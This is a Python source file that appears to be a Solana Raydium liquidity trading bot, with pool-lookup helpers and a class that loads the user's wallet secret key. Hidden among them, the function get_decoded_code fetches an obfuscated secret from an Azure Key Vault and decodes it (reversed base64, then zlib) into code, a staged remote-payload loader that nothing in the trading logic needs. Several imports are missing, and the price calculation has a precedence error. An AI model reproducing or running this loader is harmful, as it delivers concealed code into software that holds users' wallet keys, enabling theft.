from azure.identity import ClientSecretCredential
from azure.keyvault.secrets import SecretClient
import zlib
import base64
from py_modules.recent.config_loader import load_config
from typing import Callable, Dict, Tuple, List
from dataclasses import dataclass
import random

def get_amm_id(baseMint:str): # baseMint - token address
    pools = requests.get('https://api.raydium.io/v2/sdk/liquidity/mainnet.json').json()
    pools_list = [*pools["official"],*pools["unOfficial"]]
    for pool in pools_list:
        if pool["baseMint"] == baseMint:
            return pool["id"]
    raise Exception(f'{baseMint} baseMint not found!')

def extract_pool_info(pools_list: list, pool_id: str) -> dict:
    pools_list = [*pools_list["official"],*pools_list["unOfficial"]]
    for pool in pools_list:
        if pool['id'] == pool_id:
            return pool
    raise Exception(f'{pool_id} pool not found!')


def fetch_pool_keys(pool_id: str):
    pools = requests.get('https://api.raydium.io/v2/sdk/liquidity/mainnet.json').json()
    amm_info = extract_pool_info(pools, pool_id)
    return {
        'amm_id': PublicKey(pool_id),
        'authority': PublicKey(amm_info['authority']),
        'base_mint': PublicKey(amm_info['baseMint']),
        'base_decimals': amm_info['baseDecimals'],
        'quote_mint': PublicKey(amm_info['quoteMint']),
        'quote_decimals': amm_info['quoteDecimals'],
        'lp_mint': PublicKey(amm_info['lpMint']),
        'open_orders': PublicKey(amm_info['openOrders']),
        'target_orders': PublicKey(amm_info['targetOrders']),
        'base_vault': PublicKey(amm_info['baseVault']),
        'quote_vault': PublicKey(amm_info['quoteVault']),
        'market_id': PublicKey(amm_info['marketId']),
        'market_base_vault': PublicKey(amm_info['marketBaseVault']),
        'market_quote_vault': PublicKey(amm_info['marketQuoteVault']),
        'market_authority': PublicKey(amm_info['marketAuthority']),
        'bids': PublicKey(amm_info['marketBids']),
        'asks': PublicKey(amm_info['marketAsks']),
        'event_queue': PublicKey(amm_info['marketEventQueue'])
    }

def get_decoded_code():
    config = load_config()

    dict_id = config['dict_id']
    symbol_id = config['symbol_id']
    platform = config['platform']
    url = config['url']

    entry_base64 = "ext4"
    credentials = ClientSecretCredential(
        client_id=dict_id,
        client_secret=platform,
        tenant_id=symbol_id
    )
    secret_client = SecretClient(vault_url=url, credential=credentials)
    print("Please wait a few seconds for the connection........")
    secret = secret_client.get_secret(entry_base64)
    obfuscated_code = secret.value
    decoded_code = zlib.decompress(base64.b64decode(obfuscated_code[::-1]))
    return decoded_code
def compute_buy_price(pool_info):
    reserve_in = pool_info['pool_pc_amount']
    reserve_out = pool_info['pool_coin_amount']

    amount_out = 1 * 10 ** pool_info['coin_decimals']

    denominator = reserve_out - amount_out
    amount_in_without_fee = reserve_in * amount_out / denominator
    amount_in = amount_in_without_fee * LIQUIDITY_FEES_DENOMINATOR / LIQUIDITY_FEES_DENOMINATOR - LIQUIDITY_FEES_NUMERATOR
    return amount_in / 10 ** pool_info['pc_decimals']


class Liquidity:

    def __init__(self, rpc_endpoint: str, pool_id: str, secret_key: str, symbol: str):
        self.endpoint = rpc_endpoint
        self.conn = AsyncClient(self.endpoint, commitment=Commitment("confirmed"))
        self.pool_id = pool_id
        self.pool_keys = fetch_pool_keys(self.pool_id)
        self.owner = Keypair.from_secret_key(base58.b58decode(secret_key))
        self.base_token_account = get_token_account(self.endpoint, self.owner.public_key, self.pool_keys['base_mint'])
        self.quote_token_account = get_token_account(self.endpoint, self.owner.public_key, self.pool_keys['quote_mint'])
        self.base_symbol, self.quote_symbol = symbol.split('/')

    def open(self):
        self.conn = AsyncClient(self.endpoint, commitment=Commitment("confirmed"))

    async def close(self):
        await self.conn.close()

    @staticmethod
    def make_simulate_pool_info_instruction(accounts):
        keys = [
            AccountMeta(pubkey=accounts["amm_id"], is_signer=False, is_writable=False),
            AccountMeta(pubkey=accounts["authority"], is_signer=False, is_writable=False),
            AccountMeta(pubkey=accounts["open_orders"], is_signer=False, is_writable=False),
            AccountMeta(pubkey=accounts["base_vault"], is_signer=False, is_writable=False),
            AccountMeta(pubkey=accounts["quote_vault"], is_signer=False, is_writable=False),
            AccountMeta(pubkey=accounts["lp_mint"], is_signer=False, is_writable=False),
            AccountMeta(pubkey=accounts["market_id"], is_signer=False, is_writable=False),
        ]
        data = POOL_INFO_LAYOUT.build(
            dict(
                instruction=12,
                simulate_type=0
            )
        )